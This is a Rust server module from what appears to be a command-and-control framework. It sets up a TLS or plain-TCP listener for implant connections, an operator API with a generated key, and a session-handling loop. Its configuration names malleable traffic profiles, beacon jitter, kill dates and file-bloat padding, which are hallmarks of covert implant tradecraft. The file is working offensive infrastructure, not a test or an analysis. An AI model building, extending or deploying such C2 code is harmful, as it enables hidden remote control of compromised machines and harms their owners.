// src/server/mod.rs
pub mod session;
pub mod logging;

use std::sync::{Arc, Mutex};
use std::collections::HashMap;
use std::env;
use uuid::Uuid;
use tracing::{info, error};

use crate::{database, menu, api};
use crate::common::{SharedSessions, C2Config, TransportProtocol, MalleableProfile};
use crate::transport::ServerTransport;

pub async fn run() -> Result<(), Box<dyn std::error::Error>> {
    let db_pool = database::init()?;
    
    let transport_mode = match env::var("C2_TRANSPORT").unwrap_or_else(|_| "tls".into()).as_str() {
        "tcp_plain" => TransportProtocol::TcpPlain,
        _ => TransportProtocol::Tls,
    };

    let config = C2Config {
        transport: transport_mode.clone(),
        // [FIX] Initialize with MalleableProfile::default() instead of TrafficProfile
        profile: MalleableProfile::default(), 
        tunnel_port: 4443,
        server_public_key: "".into(), hash_salt: "".into(), c2_host: "".into(), 
        build_id: "SERVER".into(), 
        sleep_interval: 5, 
        jitter_min: 0, 
        jitter_max: 0, 
        bloat_mb: 0, 
        debug: true,
        kill_date: None
    };

    let (cert, key, ca) = {
        let conn = db_pool.get()?;
        database::load_or_import_certs(&conn)?
    };

    let transport = Arc::new(ServerTransport::bind(&config, &cert, &key, &ca).await?);
    
    let sessions: SharedSessions = Arc::new(Mutex::new(HashMap::new()));
    let results_store: api::SharedResults = Arc::new(Mutex::new(HashMap::new()));
    let proxy_store: api::SharedProxies = Arc::new(Mutex::new(HashMap::new()));

    let api_key = Uuid::new_v4().to_string();
    let api_port = 8080;

    println!("========================================");
    println!("[*] Transport:      {:?}", config.transport);
    println!("[*] Tunnel Port:    {}", config.tunnel_port);
    println!("[*] API Key:        {}", api_key);
    println!("[*] API Endpoint:   http://127.0.0.1:{}", api_port);
    println!("========================================");

    info!("C2 Server listening for connections...");

    let s_api = sessions.clone();
    let db_api = db_pool.clone(); 
    let res_api = results_store.clone();
    let prox_api = proxy_store.clone();
    let key_clone = api_key.clone();

    tokio::spawn(async move {
        api::start_api_server(s_api, db_api, res_api, prox_api, key_clone, api_port).await;
    });

    let s_cli = sessions.clone();
    std::thread::spawn(move || {
        if let Err(e) = menu::run(s_cli) { error!("Menu Error: {:?}", e); } 
    });

    loop {
        match transport.accept().await {
            Ok((stream, peer_addr)) => {
                let sessions = sessions.clone();
                let db = db_pool.clone();
                let results = results_store.clone();
                
                tokio::spawn(async move {
                    session::handle_connection(stream, peer_addr, sessions, db, results, None).await;
                });
            }
            Err(e) => { error!("Accept Error: {}", e); }
        }
    }
}
